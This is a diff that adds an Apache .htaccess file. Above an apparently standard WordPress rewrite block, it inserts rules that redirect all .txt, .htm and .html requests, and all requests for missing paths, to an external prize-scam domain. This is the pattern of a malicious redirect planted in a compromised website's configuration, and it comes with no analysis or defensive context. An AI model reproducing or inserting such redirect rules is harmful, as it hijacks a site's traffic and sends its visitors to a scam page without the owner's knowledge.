@@ -1,0 +1,17 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule ^.+\.txt$ http://c201122.getbestprize.life [L]
+RewriteRule ^.+\.htm$ http://c201122.getbestprize.life [L]
+RewriteRule ^.+\.html$ http://c201122.getbestprize.life [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . http://c201122.getbestprize.life [L]
+</IfModule>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
